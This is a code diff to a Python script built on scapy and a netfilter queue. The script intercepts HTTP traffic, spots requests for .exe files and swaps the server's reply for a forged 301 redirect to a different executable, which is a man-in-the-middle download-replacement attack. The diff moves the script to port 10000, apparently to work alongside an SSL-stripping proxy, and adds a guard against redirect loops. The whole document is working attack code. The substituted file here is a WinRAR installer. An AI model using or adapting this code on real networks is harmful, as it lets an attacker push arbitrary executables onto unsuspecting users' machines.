@@ -30,21 +30,22 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 10000:
             print("\nHTTP Request outbound found:\n")
             #print(scapy_packet.show())
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load and "https://rarlab.com/rar" not in scapy_packet[scapy.Raw].load:
+                #fix possible loop issue where .exe of replacement file is detected by program
                 print("\n****EXE FOUND****\n")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
+        elif scapy_packet[scapy.TCP].sport == 10000: #if this exists, packet is HTTP response inbound
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     print("++Replacing file")
                     modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
                     
                     packet.set_payload(str(modified_packet))
-
+                    
     packet.accept() #forward packets to target, connectivity seems normal
 
 try:
